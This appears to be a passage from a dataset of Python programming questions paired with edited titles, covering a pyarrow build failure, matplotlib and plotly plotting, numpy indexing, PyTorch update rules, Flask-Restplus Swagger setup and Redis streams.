build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\table.h -> build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\table_builder.h -> build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\tensor.h -> build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\test-util.h -> build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\type.h -> build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\type_fwd.h -> build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\type_traits.h -> build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\visitor.h -> build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\visitor_inline.h -> build\lib.win32-3.6\pyarrow\include\arrow creating build\lib.win32-3.6\pyarrow\include\arrow\compute copying pyarrow\include\arrow\compute\api.h -> build\lib.win32-3.6\pyarrow\include\arrow\compute copying pyarrow\include\arrow\compute\context.h -> build\lib.win32-3.6\pyarrow\include\arrow\compute copying pyarrow\include\arrow\compute\kernel.h -> build\lib.win32-3.6\pyarrow\include\arrow\compute creating build\lib.win32-3.6\pyarrow\include\arrow\compute\kernels copying pyarrow\include\arrow\compute\kernels\cast.h -> build\lib.win32-3.6\pyarrow\include\arrow\compute\kernels copying pyarrow\include\arrow\compute\kernels\hash.h -> build\lib.win32-3.6\pyarrow\include\arrow\compute\kernels creating build\lib.win32-3.6\pyarrow\include\arrow\io copying pyarrow\include\arrow\io\api.h -> build\lib.win32-3.6\pyarrow\include\arrow\io copying pyarrow\include\arrow\io\file.h -> build\lib.win32-3.6\pyarrow\include\arrow\io copying pyarrow\include\arrow\io\hdfs.h -> build\lib.win32-3.6\pyarrow\include\arrow\io copying pyarrow\include\arrow\io\interfaces.h -> build\lib.win32-3.6\pyarrow\include\arrow\io copying pyarrow\include\arrow\io\memory.h -> build\lib.win32-3.6\pyarrow\include\arrow\io creating build\lib.win32-3.6\pyarrow\include\arrow\ipc copying pyarrow\include\arrow\ipc\api.h -> build\lib.win32-3.6\pyarrow\include\arrow\ipc copying pyarrow\include\arrow\ipc\dictionary.h -> build\lib.win32-3.6\pyarrow\include\arrow\ipc copying pyarrow\include\arrow\ipc\feather.h -> build\lib.win32-3.6\pyarrow\include\arrow\ipc copying pyarrow\include\arrow\ipc\json.h -> build\lib.win32-3.6\pyarrow\include\arrow\ipc copying pyarrow\include\arrow\ipc\message.h -> build\lib.win32-3.6\pyarrow\include\arrow\ipc copying pyarrow\include\arrow\ipc\reader.h -> build\lib.win32-3.6\pyarrow\include\arrow\ipc copying pyarrow\include\arrow\ipc\writer.h -> build\lib.win32-3.6\pyarrow\include\arrow\ipc creating build\lib.win32-3.6\pyarrow\include\arrow\python copying pyarrow\include\arrow\python\api.h -> build\lib.win32-3.6\pyarrow\include\arrow\python copying pyarrow\include\arrow\python\arrow_to_pandas.h -> build\lib.win32-3.6\pyarrow\include\arrow\python copying pyarrow\include\arrow\python\arrow_to_python.h -> build\lib.win32-3.6\pyarrow\include\arrow\python copying pyarrow\include\arrow\python\builtin_convert.h -> build\lib.win32-3.6\pyarrow\include\arrow\python copying pyarrow\include\arrow\python\common.h -> build\lib.win32-3.6\pyarrow\include\arrow\python copying pyarrow\include\arrow\python\config.h -> build\lib.win32-3.6\pyarrow\include\arrow\python copying pyarrow\include\arrow\python\helpers.h -> build\lib.win32-3.6\pyarrow\include\arrow\python copying pyarrow\include\arrow\python\init.h -> build\lib.win32-3.6\pyarrow\include\arrow\python copying pyarrow\include\arrow\python\io.h -> build\lib.win32-3.6\pyarrow\include\arrow\python copying pyarrow\include\arrow\python\numpy_convert.h -> build\lib.win32-3.6\pyarrow\include\arrow\python copying pyarrow\include\arrow\python\numpy_interop.h -> build\lib.win32-3.6\pyarrow\include\arrow\python copying pyarrow\include\arrow\python\numpy_to_arrow.h -> build\lib.win32-3.6\pyarrow\include\arrow\python copying pyarrow\include\arrow\python\platform.h -> build\lib.win32-3.6\pyarrow\include\arrow\python copying pyarrow\include\arrow\python\pyarrow.h -> build\lib.win32-3.6\pyarrow\include\arrow\python copying pyarrow\include\arrow\python\python_to_arrow.h -> build\lib.win32-3.6\pyarrow\include\arrow\python copying pyarrow\include\arrow\python\type_traits.h -> build\lib.win32-3.6\pyarrow\include\arrow\python creating build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\bit-stream-utils.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\bit-util.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\bpacking.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\compiler-util.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\compression.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\compression_brotli.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\compression_lz4.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\compression_snappy.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\compression_zlib.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\compression_zstd.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\cpu-info.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\decimal.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\hash-util.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\hash.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\key_value_metadata.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\logging.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\macros.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\parallel.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\rle-encoding.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\sse-util.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\stl.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\type_traits.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\variant.h -> build\lib.win32-3.6\pyarrow\include\arrow\util copying pyarrow\include\arrow\util\visibility.h -> build\lib.win32-3.6\pyarrow\include\arrow\util creating build\lib.win32-3.6\pyarrow\include\arrow\util\variant copying pyarrow\include\arrow\util\variant\optional.h -> build\lib.win32-3.6\pyarrow\include\arrow\util\variant copying pyarrow\include\arrow\util\variant\recursive_wrapper.h -> build\lib.win32-3.6\pyarrow\include\arrow\util\variant copying pyarrow\include\arrow\util\variant\variant_cast.h -> build\lib.win32-3.6\pyarrow\include\arrow\util\variant copying pyarrow\include\arrow\util\variant\variant_io.h -> build\lib.win32-3.6\pyarrow\include\arrow\util\variant copying pyarrow\include\arrow\util\variant\variant_visitor.h -> build\lib.win32-3.6\pyarrow\include\arrow\util\variant creating build\lib.win32-3.6\pyarrow\includes copying pyarrow\includes\__init__.pxd -> build\lib.win32-3.6\pyarrow\includes copying pyarrow\includes\common.pxd -> build\lib.win32-3.6\pyarrow\includes copying pyarrow\includes\libarrow.pxd -> build\lib.win32-3.6\pyarrow\includes copying pyarrow\includes\libarrow_cuda.pxd -> build\lib.win32-3.6\pyarrow\includes creating build\lib.win32-3.6\pyarrow\tensorflow copying pyarrow\tensorflow\plasma_op.cc -> build\lib.win32-3.6\pyarrow\tensorflow copying pyarrow\tests\pyarrow_cython_example.pyx -> build\lib.win32-3.6\pyarrow\tests creating build\lib.win32-3.6\pyarrow\tests\data creating build\lib.win32-3.6\pyarrow\tests\data\orc copying pyarrow\tests\data\orc\README.md -> build\lib.win32-3.6\pyarrow\tests\data\orc copying pyarrow\tests\data\orc\TestOrcFile.emptyFile.jsn.gz -> build\lib.win32-3.6\pyarrow\tests\data\orc copying pyarrow\tests\data\orc\TestOrcFile.emptyFile.orc -> build\lib.win32-3.6\pyarrow\tests\data\orc copying pyarrow\tests\data\orc\TestOrcFile.test1.jsn.gz -> build\lib.win32-3.6\pyarrow\tests\data\orc copying pyarrow\tests\data\orc\TestOrcFile.test1.orc -> build\lib.win32-3.6\pyarrow\tests\data\orc copying pyarrow\tests\data\orc\TestOrcFile.testDate1900.jsn.gz -> build\lib.win32-3.6\pyarrow\tests\data\orc copying pyarrow\tests\data\orc\TestOrcFile.testDate1900.orc -> build\lib.win32-3.6\pyarrow\tests\data\orc copying pyarrow\tests\data\orc\decimal.jsn.gz -> build\lib.win32-3.6\pyarrow\tests\data\orc copying pyarrow\tests\data\orc\decimal.orc -> build\lib.win32-3.6\pyarrow\tests\data\orc creating build\lib.win32-3.6\pyarrow\tests\data\parquet copying pyarrow\tests\data\parquet\v0.7.1.all-named-index.parquet -> build\lib.win32-3.6\pyarrow\tests\data\parquet copying pyarrow\tests\data\parquet\v0.7.1.column-metadata-handling.parquet -> build\lib.win32-3.6\pyarrow\tests\data\parquet copying pyarrow\tests\data\parquet\v0.7.1.parquet -> build\lib.win32-3.6\pyarrow\tests\data\parquet copying pyarrow\tests\data\parquet\v0.7.1.some-named-index.parquet -> build\lib.win32-3.6\pyarrow\tests\data\parquet warning: build_py: byte-compiling is disabled, skipping. running build_ext creating build\temp.win32-3.6 creating build\temp.win32-3.6\Release Traceback (most recent call last): File ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\site-packages\pip\_vendor\pep517\_in_process.py"", line 207, in <module> main() File ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\site-packages\pip\_vendor\pep517\_in_process.py"", line 197, in main json_out['return_val'] = hook(**hook_input['kwargs']) File ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\site-packages\pip\_vendor\pep517\_in_process.py"", line 141, in build_wheel metadata_directory) File ""C:\Users\NICKAL~1\AppData\Local\Temp\pip-build-env-quyk7sl2\overlay\Lib\site-packages\setuptools\build_meta.py"", line 158, in build_wheel _run_setup() File ""C:\Users\NICKAL~1\AppData\Local\Temp\pip-build-env-quyk7sl2\overlay\Lib\site-packages\setuptools\build_meta.py"", line 85, in _run_setup exec(compile(code, __file__, 'exec'), locals()) File ""setup.py"", line 586, in <module> url=""https://arrow.apache.org/"" File ""C:\Users\NICKAL~1\AppData\Local\Temp\pip-build-env-quyk7sl2\overlay\Lib\site-packages\setuptools\__init__.py"", line 143, in setup return distutils.core.setup(**attrs) File ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\distutils\core.py"", line 148, in setup dist.run_commands() File ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\distutils\dist.py"", line 955, in run_commands self.run_command(cmd) File ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\distutils\dist.py"", line 974, in run_command cmd_obj.run() File ""C:\Users\NICKAL~1\AppData\Local\Temp\pip-build-env-quyk7sl2\overlay\Lib\site-packages\wheel\bdist_wheel.py"", line 188, in run self.run_command('build') File ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\distutils\cmd.py"", line 313, in run_command self.distribution.run_command(command) File ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\distutils\dist.py"", line 974, in run_command cmd_obj.run() File ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\distutils\command\build.py"", line 135, in run self.run_command(cmd_name) File ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\distutils\cmd.py"", line 313, in run_command self.distribution.run_command(command) File ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\distutils\dist.py"", line 974, in run_command cmd_obj.run() File ""setup.py"", line 88, in run self._run_cmake() File ""setup.py"", line 248, in _run_cmake raise RuntimeError('Not supported on 32-bit Windows') RuntimeError: Not supported on 32-bit Windows ---------------------------------------- Running setup.py clean for pyarrowFailed to build pyarrow Failed building wheel for pyarrowCould not build wheels for {} which use PEP 517 and cannot be installed directly","""Feather"" library installation failing in PyCharm"
How to change marker size/scale in matplotlib plot when marker is set to pixel," I am scatter ploting data points with a very small marker (see screengrab below). When I use the very small marker ',' the legend is very hard to read (example code taken from here).(Python 3, Jupyter lab)How can I increase the size of the marker in the legend. The two versions shown on the above mentioned site do not work: and The two solutions do however work when the marker is set to '.'.How can I show bigger makers in the legend?Sample Code from intoli.com: <code>  legend = ax.legend(frameon=True) for legend_handle in legend.legendHandles: legend_handle._legmarker.set_markersize(9) ax.legend(markerscale=6) import numpy as npimport matplotlib.pyplot as pltnp.random.seed(12)fig = plt.figure()ax = fig.add_subplot(1, 1, 1)for i in range(5): mean = [np.random.random()*10, np.random.random()*10] covariance = [ [1 + np.random.random(), np.random.random() - 1], [0, 1 + np.random.random()], ] covariance[1][0] = covariance[0][1] # must be symmetric x, y = np.random.multivariate_normal(mean, covariance, 3000).T plt.plot(x, y, ',', label=f'Cluster {i + 1}')ax.legend(markerscale=12)fig.tight_layout()plt.show()",How to change marker size/scale in legend when marker is set to pixel
how to understand Seaboarn heatmap annot format?," I am looking for a way to show ""0.0045"" as ""0.45%"" on seaboarn's heatmap by specifying the fmt keyword: However, I did not find a list of format to use. Searching between different examples, I have seen ""d"", "".2g"", "".1f"", "".1f%"". But it is not clear what is the convention we are assuming here.Is this assuming people have a common understanding of the formatting format? Or this is present on a doc page I missed? <code>  sns.heatmap(data, annot=True, fmt='??')",how to understand Seaborn's heatmap annotation format?
Why does Python allow out of range array indexes?," So I just came across what seems to me like a strange Python feature and wanted some clarification about it. The following array manipulation somewhat makes sense: I imagine it is actually just appending this value to the end, correct?Why can I do this, however? And even more so this: This just seems like wrong logic. It seems like this should throw an error! Any explanation?-Is it just a weird thing Python does?-Is there a purpose to it?-Or am I thinking about this the wrong way? <code>  p = [1,2,3]p[3:] = [4] p = [1,2,3,4] p[20:22] = [5,6]p = [1,2,3,4,5,6] p[20:100] = [7,8]p = [1,2,3,4,5,6,7,8]",Why does Python allow out-of-range slice indexes for sequences?
Python pathlib : Convert WindowsPath to PosixPath," I am using pathlib to manage my paths in my Python project using the Path class.When I am using Linux, everything works fine. But on Windows, I have a little issue.At some point in my code, I have to write a JavaScript file which lists the references to several other files. These paths have to be written in POSIX format. But when I do str(my_path_instance) on Windows, The path is written in Windows format.Do you know a simple way to convert a WindowsPath to a PosixPath with pathlib? <code> ",Convert WindowsPath to PosixPath
Pytorch: How to create an update rule the doesn't come from derivatives?," I want to implement the following algorithm, taken from this book, section 13.6:I don't understand how to implement the update rule in pytorch (the rule for w is quite similar to that of theta).As far as I know, torch requires a loss for loss.backwward().This form does not seem to apply for the quoted algorithm.I'm still certain there is a correct way of implementing such update rules in pytorch.Would greatly appreciate a code snippet of how the w weights should be updated, given that V(s,w) is the output of the neural net, parameterized by w.EDIT: Chris Holland suggested a way to implement, and I implemented it. It does not converge on Cartpole, and I wonder if I did something wrong.The critic does converge on the solution to the function gamma*f(n)=f(n)-1 which happens to be the sum of the series gamma+gamma^2+...+gamma^infmeaning, gamma=1 diverges. gamma=0.99 converges on 100, gamma=0.5 converges on 2 and so on. Regardless of the actor or policy.The code: and EDIT 2:Chris Holland's solution works. The problem originated from a bug in my code that caused the line to always get called, thus expected_reward_from_t1 was never zero, and thus no stopping condition was specified for the bellman equation recursion.With no reward engineering, gamma=1, lambda=0.6, and a single hidden layer of size 128 for both actor and critic, this converged on a rather stable optimal policy within 500 episodes.Even faster with gamma=0.99, as the graph shows (best discounted episode reward is about 86.6).BIG thank you to @Chris Holland, who ""gave this a try"" <code>  def _update_grads_with_eligibility(self, is_critic, delta, discount, ep_t): gamma = self.args.gamma if is_critic: params = list(self.critic_nn.parameters()) lamb = self.critic_lambda eligibilities = self.critic_eligibilities else: params = list(self.actor_nn.parameters()) lamb = self.actor_lambda eligibilities = self.actor_eligibilities is_episode_just_started = (ep_t == 0) if is_episode_just_started: eligibilities.clear() for i, p in enumerate(params): if not p.requires_grad: continue eligibilities.append(torch.zeros_like(p.grad, requires_grad=False)) # eligibility traces for i, p in enumerate(params): if not p.requires_grad: continue eligibilities[i][:] = (gamma * lamb * eligibilities[i]) + (discount * p.grad) p.grad[:] = delta.squeeze() * eligibilities[i] expected_reward_from_t = self.critic_nn(s_t)probs_t = self.actor_nn(s_t)expected_reward_from_t1 = torch.tensor([[0]], dtype=torch.float)if s_t1 is not None: # s_t is not a terminal state, s_t1 exists. expected_reward_from_t1 = self.critic_nn(s_t1)delta = r_t + gamma * expected_reward_from_t1.data - expected_reward_from_t.datanegative_expected_reward_from_t = -expected_reward_from_tself.critic_optimizer.zero_grad()negative_expected_reward_from_t.backward()self._update_grads_with_eligibility(is_critic=True, delta=delta, discount=discount, ep_t=ep_t)self.critic_optimizer.step() if s_t1 is not None: expected_reward_from_t1 = self.critic_nn(s_t1)",Pytorch: How to create an update rule that doesn't come from derivatives?
What is the different between Pytesseract and Tesserocr?, I'm using Python 3.6 in Windows 10 and have Pytesseract already installed but I found in a code Tesserocr which by the way I can't install. What is the difference? <code> ,What is the difference between Pytesseract and Tesserocr?
"Swagger with Flask-Restful, Api and multiple Blueprints"," I'm building a very complex microservice using Flask and Flask-Restplus. It will have many endpoints, thus I'm organizing each endpoint into a separate Blueprint.Currently, I'm struggling with the usage of Flask-Restplus and API using multiple Blueprints in combination with swaggerI want to be able to get all the endpoints of my blueprints into the built-in swagger of API, but this doesn't seem to work.I can access my endpoints via postman, but the swagger-UI doesn't show anything. :(The following example code and directory structure should give you a hint towards my idea: My main init.py looks like this: endpointa.py with the corresponding Blueprint: Again: I can access my endpoints via postman, but the swagger-UI doesn't show anything:Normally I would add endpoints to API using something like but this doesn't seem to be possible with multiple Blueprints.Can anyone show me how to add/register these Blueprints (endpointa_api, endpointb_api and endpointc_api) with Api ? <code>  . endpoints endpointa.py endpointb.py endpointc.py __init__.py __init__.py run.py from flask import Flask, Blueprint, logging, jsonify, request, Responsefrom flask_restplus import Resource, Api # create app and apiapp = Flask(__name__)api_prefix = '/api/v1/'# register Blueprintsfrom endpoints.endpointa import endpointa_apiapp.register_blueprint(endpointa_api, url_prefix=api_prefix)from endpoints.endpointb import endpointb_apiapp.register_blueprint(endpointb_api, url_prefix=api_prefix)from endpoints.endpointc import endpointc_apiapp.register_blueprint(endpointc_api, url_prefix=api_prefix)api = Api(app, version='1', title='Test Service REST-API', description='A REST-API for the Test Service, implemented in python')if __name__ == '__main__': app.run(debug=True, host=""0.0.0.0"", port=5060) from os import environimport json, ast, syslogimport requestsimport gcfrom flask import Flask, Blueprint, logging, jsonify, request, Responsefrom flask_restplus import Resource, Apiendpointa_api = Blueprint('endpointa_api', __name__)@endpointa_api.route('testa', methods=['GET'])def testa(): ...@endpointa_api.route('testa/<string:testa_id>', methods=['GET', 'POST'])def testa_id(): ... api.add_resource(TestClass, api_prefix + 'test')","SOLVED: Swagger with Flask-Restplus, API and multiple Blueprints"
"Swagger with Flask-Restful, API and multiple Blueprints"," I'm building a very complex microservice using Flask and Flask-Restplus. It will have many endpoints, thus I'm organizing each endpoint into a separate Blueprint.Currently, I'm struggling with the usage of Flask-Restplus and API using multiple Blueprints in combination with swaggerI want to be able to get all the endpoints of my blueprints into the built-in swagger of API, but this doesn't seem to work.I can access my endpoints via postman, but the swagger-UI doesn't show anything. :(The following example code and directory structure should give you a hint towards my idea: My main init.py looks like this: endpointa.py with the corresponding Blueprint: Again: I can access my endpoints via postman, but the swagger-UI doesn't show anything:Normally I would add endpoints to API using something like but this doesn't seem to be possible with multiple Blueprints.Can anyone show me how to add/register these Blueprints (endpointa_api, endpointb_api and endpointc_api) with Api ? <code>  . endpoints endpointa.py endpointb.py endpointc.py __init__.py __init__.py run.py from flask import Flask, Blueprint, logging, jsonify, request, Responsefrom flask_restplus import Resource, Api # create app and apiapp = Flask(__name__)api_prefix = '/api/v1/'# register Blueprintsfrom endpoints.endpointa import endpointa_apiapp.register_blueprint(endpointa_api, url_prefix=api_prefix)from endpoints.endpointb import endpointb_apiapp.register_blueprint(endpointb_api, url_prefix=api_prefix)from endpoints.endpointc import endpointc_apiapp.register_blueprint(endpointc_api, url_prefix=api_prefix)api = Api(app, version='1', title='Test Service REST-API', description='A REST-API for the Test Service, implemented in python')if __name__ == '__main__': app.run(debug=True, host=""0.0.0.0"", port=5060) from os import environimport json, ast, syslogimport requestsimport gcfrom flask import Flask, Blueprint, logging, jsonify, request, Responsefrom flask_restplus import Resource, Apiendpointa_api = Blueprint('endpointa_api', __name__)@endpointa_api.route('testa', methods=['GET'])def testa(): ...@endpointa_api.route('testa/<string:testa_id>', methods=['GET', 'POST'])def testa_id(): ... api.add_resource(TestClass, api_prefix + 'test')","SOLVED: Swagger with Flask-Restplus, API and multiple Blueprints"
"Swagger with Flask-Restplus, API and multiple Blueprints"," I'm building a very complex microservice using Flask and Flask-Restplus. It will have many endpoints, thus I'm organizing each endpoint into a separate Blueprint.Currently, I'm struggling with the usage of Flask-Restplus and API using multiple Blueprints in combination with swaggerI want to be able to get all the endpoints of my blueprints into the built-in swagger of API, but this doesn't seem to work.I can access my endpoints via postman, but the swagger-UI doesn't show anything. :(The following example code and directory structure should give you a hint towards my idea: My main init.py looks like this: endpointa.py with the corresponding Blueprint: Again: I can access my endpoints via postman, but the swagger-UI doesn't show anything:Normally I would add endpoints to API using something like but this doesn't seem to be possible with multiple Blueprints.Can anyone show me how to add/register these Blueprints (endpointa_api, endpointb_api and endpointc_api) with Api ? <code>  . endpoints endpointa.py endpointb.py endpointc.py __init__.py __init__.py run.py from flask import Flask, Blueprint, logging, jsonify, request, Responsefrom flask_restplus import Resource, Api # create app and apiapp = Flask(__name__)api_prefix = '/api/v1/'# register Blueprintsfrom endpoints.endpointa import endpointa_apiapp.register_blueprint(endpointa_api, url_prefix=api_prefix)from endpoints.endpointb import endpointb_apiapp.register_blueprint(endpointb_api, url_prefix=api_prefix)from endpoints.endpointc import endpointc_apiapp.register_blueprint(endpointc_api, url_prefix=api_prefix)api = Api(app, version='1', title='Test Service REST-API', description='A REST-API for the Test Service, implemented in python')if __name__ == '__main__': app.run(debug=True, host=""0.0.0.0"", port=5060) from os import environimport json, ast, syslogimport requestsimport gcfrom flask import Flask, Blueprint, logging, jsonify, request, Responsefrom flask_restplus import Resource, Apiendpointa_api = Blueprint('endpointa_api', __name__)@endpointa_api.route('testa', methods=['GET'])def testa(): ...@endpointa_api.route('testa/<string:testa_id>', methods=['GET', 'POST'])def testa_id(): ... api.add_resource(TestClass, api_prefix + 'test')","SOLVED: Swagger with Flask-Restplus, API and multiple Blueprints"
Is there a simple way to partly merge arrays in python," I want to merge two arrays in python in a special way. The entries with an odd index of my output array out shall be the coresponding entries of my first input array in0. The entries with an even index in out shall be the coresponding entries of my second input array in1.in0, in1 and out are all the same length.Example:The input arrays shall be merge to the output array Is there a nicer way than to loop over the whole length of the inputs and fill my out 'by hand'? <code>  in0 = [0, 1, 2, 3]in1 = [4, 5, 6, 7] out = [0, 5, 2, 7]",Combine elements from two lists
Access elements from a Matrix by a list of indices in Python," I know how to access elements in a vector by indices doing: which gives the correct answer : [2 4 6]But I am trying to do the same thing using a 2D matrix, something like: this should display me ""[0.0 0.9]"" for the value at (0,0) and the one at (1,1) in the matrix. But instead it displays ""[ 0.1 0.1]"". Also if I try to use 3 indices with : I now get the following error: I ultimately need to apply a simple max() operation on all the elements at these indices and need the fastest way to do that for optimization purposes.What am I doing wrong ? How can I access specific elements in a matrix to do some operation on them in a very efficient way (not using list comprehension nor a loop). <code>  test = numpy.array([1,2,3,4,5,6])indices = list([1,3,5])print(test[indices]) currentGrid = numpy.array( [[0, 0.1], [0.9, 0.9], [0.1, 0.1]])indices = list([(0,0),(1,1)])print(currentGrid[indices]) indices = list([(0,0),(1,1),(0,2)]) Traceback (most recent call last): File ""main.py"", line 43, in <module> print(currentGrid[indices])IndexError: too many indices for array","Access elements of a Matrix by a list of indices in Python to apply a max(val, 0.5) to each value without a for loop"
Access elements from a Matrix by a list of indices in Python to apply a max() to each without a for loop," I know how to access elements in a vector by indices doing: which gives the correct answer : [2 4 6]But I am trying to do the same thing using a 2D matrix, something like: this should display me ""[0.0 0.9]"" for the value at (0,0) and the one at (1,1) in the matrix. But instead it displays ""[ 0.1 0.1]"". Also if I try to use 3 indices with : I now get the following error: I ultimately need to apply a simple max() operation on all the elements at these indices and need the fastest way to do that for optimization purposes.What am I doing wrong ? How can I access specific elements in a matrix to do some operation on them in a very efficient way (not using list comprehension nor a loop). <code>  test = numpy.array([1,2,3,4,5,6])indices = list([1,3,5])print(test[indices]) currentGrid = numpy.array( [[0, 0.1], [0.9, 0.9], [0.1, 0.1]])indices = list([(0,0),(1,1)])print(currentGrid[indices]) indices = list([(0,0),(1,1),(0,2)]) Traceback (most recent call last): File ""main.py"", line 43, in <module> print(currentGrid[indices])IndexError: too many indices for array","Access elements of a Matrix by a list of indices in Python to apply a max(val, 0.5) to each value without a for loop"
Access elements of a Matrix by a list of indices in Python to apply a max() to each without a for loop," I know how to access elements in a vector by indices doing: which gives the correct answer : [2 4 6]But I am trying to do the same thing using a 2D matrix, something like: this should display me ""[0.0 0.9]"" for the value at (0,0) and the one at (1,1) in the matrix. But instead it displays ""[ 0.1 0.1]"". Also if I try to use 3 indices with : I now get the following error: I ultimately need to apply a simple max() operation on all the elements at these indices and need the fastest way to do that for optimization purposes.What am I doing wrong ? How can I access specific elements in a matrix to do some operation on them in a very efficient way (not using list comprehension nor a loop). <code>  test = numpy.array([1,2,3,4,5,6])indices = list([1,3,5])print(test[indices]) currentGrid = numpy.array( [[0, 0.1], [0.9, 0.9], [0.1, 0.1]])indices = list([(0,0),(1,1)])print(currentGrid[indices]) indices = list([(0,0),(1,1),(0,2)]) Traceback (most recent call last): File ""main.py"", line 43, in <module> print(currentGrid[indices])IndexError: too many indices for array","Access elements of a Matrix by a list of indices in Python to apply a max(val, 0.5) to each value without a for loop"
How to plot the slope/tangent of parabola at any point? (using python and matplotlib)," I want to plot a simple illustration of using derivative to find out a slope of a function at any point. It would look kinda like this:I have already plotted a simple parabola using this code: Now I want to add something like this: To draw a tangent line going through the current_weight.But I can't seem to figure this out, can you help? <code>  import numpy as npfrom matplotlib import pyplot as pltinputs = 0.2weights = np.arange(-6,14)target_prediction = 0.7prediction = inputs*weightserrors = (prediction - target_prediction) ** 2plt.xlabel(""Weight"")plt.ylabel(""Error"")plt.plot(weights, error) current_weight = 5# draw a short fraction of a line to represent slopex = np.arange(optimal_weight - 3, optimal_weight + 3)# derivativeslope = 2 * (inputs*current_weight - target_prediction)y = slope*x # How should this equation look like?plt.plot(x, y)",How to plot the slope (tangent line) of parabola at any point?
How to plot the slope/tangent of parabola at any point?," I want to plot a simple illustration of using derivative to find out a slope of a function at any point. It would look kinda like this:I have already plotted a simple parabola using this code: Now I want to add something like this: To draw a tangent line going through the current_weight.But I can't seem to figure this out, can you help? <code>  import numpy as npfrom matplotlib import pyplot as pltinputs = 0.2weights = np.arange(-6,14)target_prediction = 0.7prediction = inputs*weightserrors = (prediction - target_prediction) ** 2plt.xlabel(""Weight"")plt.ylabel(""Error"")plt.plot(weights, error) current_weight = 5# draw a short fraction of a line to represent slopex = np.arange(optimal_weight - 3, optimal_weight + 3)# derivativeslope = 2 * (inputs*current_weight - target_prediction)y = slope*x # How should this equation look like?plt.plot(x, y)",How to plot the slope (tangent line) of parabola at any point?
Python example of xadd and xread," Could you give a very simple example of using Redis' xread and xadd in Python ( that displays the type and format of return values form xread and input of xadd)? I've already read many documentation but none of them are in Python.The Redis doc gives an example: but If I try in python: I get this error: <code>  > XADD mystream * sensor-id 1234 temperature 19.81518951480106-0 sample = {b""hello"":b""12""}id = r.xadd(""mystream"", sample) redis.exceptions.ResponseError: WRONGTYPE Operation against a key holding the wrong kind of value",Redis - Python example of xadd and xread
Python: How to make alternating background color using plotly?," Using only these few lines of code from plot.ly will give you the plot below in a jupyter notebook:Snippet 1: Plot 1:How can you set it up so you can have alternating bakcground colors in the plot below like it was shown in this post using matplotlib?Here's a link that explains how to add shaded areas like this:Snippet 2: Plot 2:Thank you for any suggestions! <code>  import plotlyimport cufflinks as cffrom plotly.offline import download_plotlyjs, init_notebook_mode, plot, iplotinit_notebook_mode(connected=True)iplot(cf.datagen.lines().iplot(asFigure=True, kind='scatter',xTitle='Dates',yTitle='Returns',title='Returns')) df.iplot(vspan={'x0':'2015-02-15','x1':'2015-03-15','color':'rgba(30,30,30,0.3)','fill':True,'opacity':.4}, filename='cufflinks/custom-regions')",Python: How to make shaded areas or alternating background color using plotly?
